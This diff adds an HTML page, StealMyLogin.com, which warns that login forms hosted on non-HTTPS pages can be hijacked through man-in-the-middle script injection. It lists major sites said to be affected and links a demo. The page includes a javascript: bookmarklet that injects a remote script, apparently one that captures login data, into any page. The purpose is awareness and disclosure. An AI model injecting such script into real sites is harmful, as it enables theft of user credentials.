@@ -1,0 +1,158 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+
+<title>StealMyLogin.com - exposing the dangers of insecure login forms</title>
+
+<style type="text/css">
+body { font-family: Verdana,Tahoma,Helvetica,sans-serif; font-size: 14px; line-height:1.4em; padding:0;margin:0;  }
+a, a:link,a:visited,a:active { color: #2F84EA; text-decoration: none; }
+a:hover { color: #2F84EA; text-decoration: underline; } 
+h1 { margin: 4px 0 0 0; padding: 0; font-size: 22px; }
+h2 { font-size: 18px; margin: 1em 0 0.5em 0; }
+p { margin:10px 0 0; }
+li { margin: 0.5em 0; }
+#wrapper { background: #fcfcfc; margin: 0 auto; width:640px; padding: 1em; border: 1px solid #ddd; border-width: 0 1px; }
+#footer, #tags { margin: 1em 0; color: #999; font-size: 0.9em;  width: 900px; }
+.problem { color: red; }
+.bookmarklet { border: 1px solid #ddd; padding: 1px 3px; background: #f4f4f4;}
+.author { float:right; font-size: 0.85em; color: #666 }
+.fixed {text-decoration: line-through !important;} 
+</style>
+
+</head>
+<body>
+
+<div id="wrapper">
+
+<h1>Steal My Login</h1>
+<p class="author">written by <a href="http://www.iosart.com/">Alex Sirota</a>
+<p>Exposing the dangers of insecure login forms
+
+<p>
+<a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="iosart">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
+
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwwwl.stealmylogin.com%2F&amp;layout=button_count&amp;show_faces=true&amp;width=450&amp;action=like&amp;font=arial&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:21px;margin-top:2px" allowTransparency="true"></iframe>
+
+<p>
+<a href="http://www.stealmylogin.com/#disqus_thread">Comments</a>
+
+<h2>Intro</h2>
+<p>
+We often use an insecure internet connection to browse the web - for example using a <a href="http://en.wikipedia.org/wiki/Hotspot_%28Wi-Fi%29#Security_concerns">public Wi-Fi hotspot</a> or if our router is configured to communicate using an <a href="http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy#Flaws">insecure protocol</a>. This exposes us to <a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack">Man-in-the-middle attacks</a>, with malicious attackers trying to steal our login information, passwords etc. 
+
+<p>
+There is an easy solution to this problem - when sending sensitive information a website should always use a secure protocol such as <a href="http://en.wikipedia.org/wiki/Secure_Sockets_Layer">HTTPS</a>. This way, attackers listening to the communication only see encrypted info they cannot decrypt. You know that your communication is secure when the website address starts with 'https:' and your browser displays a lock icon and additional UI cues.  
+
+<h2>The problem</h2>
+<p>
+<strong class="problem">While most websites implemented a secure way to send login information, their implementation is flawed, still allowing a malicious attacker to steal your login information.</strong>
+<p>
+In order for the secure login form to protect you, both the page that displays the login form and the page the form is being submitted to need to be HTTPS. 
+<p>
+Many of the biggest sites on the Web have non-HTTPS pages hosting the actual login form, even if they submit the login info to an HTTPS page.
+<p>
+<strong class="problem">A malicious attacker can easily inject some code to the non-HTTPS page that hosts the login form, and steal your info just before it is being securely submitted.</strong>
+
+<h2>Demo</h2>
+Check out the <a href="demo.html">StealMyLogin demo</a>. 
+Similarly to many sites, in <a href="demo.html">the demo</a> a non-HTTPS page contains a login form that is securely submitted to an HTTPS page. 
+<p>
+If you look at the source code of the demo page, you'll see that we injected a malicious JavaScript file <a href="http://data.stealmylogin.com/stealmylogin.js">stealmylogin.js</a> into the page, just as an attacker might. This malicious code steals the login info just before its being securely submitted to the service.
+
+<h2>Bookmarklet</h2>
+Want to try this attack yourself on one of your favorite websites? Just drag the following link <a class="bookmarklet" href="javascript:(function() {var s=document.createElement('script');s.src='http://data.stealmylogin.com/stealmylogin.js';document.getElementsByTagName('head')[0].appendChild(s);alert('StealMyLogin injected');})();">StealMyLogin</a> to your browser's toolbar, navigate to a non-HTTPS page that has a login form, click on the bookmarklet to simulate an attacker injecting a malicious piece of code into the page, and proceed to login into the service. 
+
+<h2>List of offenders</h2>
+This is obviously a very partial list, but it's amazing how many of the biggest sites on the Web have this significant security flaw.
+<ul>
+<li><a href="http://linkedin.com/">LinkedIn</a>
+<li><a class="fixed" href="http://twitter.com/">Twitter</a>
+<li><a href="http://facebook.com/">Facebook</a>
+<li><a href="http://www.att.com/">AT&T</a>
+<li><a class="fixed" href="http://www.netflix.com/">Netflix</a>
+<li><a href="http://www.godaddy.com/">GoDaddy</a>
+<li><a href="http://www.progressive.com/login.aspx">Progressive</a>
+<li><a href="http://www3.tivo.com/tivo-tco/login/show.do">Tivo</a>
+<li><a class="fixed" href="http://www.ups.com">UPS</a>
+</ul>
+
+
+<h2>Additional background</h2>
+Some assumptions:
+<ol>
+<li>There are bad people out there looking to steal your bank or credit card information, your money and your identity.
+<li>Many people use the same password and username in many different online services, including banks.
+<li>Malicious attackers will try to get your login information for any of the services you're using, which will then allow them to break into the rest.
+</ol>
+
+<p>
+There are several ways an attacker can try and steal your login information, like: 
+<ul>
+<li><a href="http://en.wikipedia.org/wiki/Phishing">Phishing</a>  - sending you an email linking to a fake site that looks like the real thing.
+<li><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting (XSS)</a>  - exploiting a vulnerability in a website to inject custom JavaScript code that would then try to steal your info.
+<li><a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack">Man-in-the-middle attack</a> - listening to information flowing through an insecure data connection (like a malicious "free" wifi hotspot), potentially injecting malicious code into the visited websites.
+</ul>
+<p>
+Here, we are discussing the last type of attack - Man-in-the-middle.
+
+<h2>References</h2>
+<ul>
+<li><a href="http://blogs.msdn.com/b/ie/archive/2005/04/20/410240.aspx">TLS and SSL in the real world</a>
+</ul>
+
+<h2>Discuss</h2>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+  /**
+    * var disqus_identifier; [Optional but recommended: Define a unique identifier (e.g. post id or slug) for this thread] 
+    */
+  (function() {
+   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+   dsq.src = 'http://stealmylogin.disqus.com/embed.js';
+   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript=stealmylogin">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+<div id="tags">
+Tags: security, identity theft, phishing, https, ssl, login form, username, passwords
+</div>
+<div id="footer"><span class="copyright">Copyright &copy; 2010 <a href="http://www.iosart.com/">Alex Sirota</a></span></div>
+
+</div> <!-- wrapper -->
+
+<script type="text/javascript"> 
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-1155620-6']);
+  _gaq.push(['_trackPageview']);
+ 
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script> 
+
+
+<script type="text/javascript">
+var disqus_shortname = 'stealmylogin';
+(function () {
+  var s = document.createElement('script'); s.async = true;
+  s.src = 'http://disqus.com/forums/stealmylogin/count.js';
+  (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
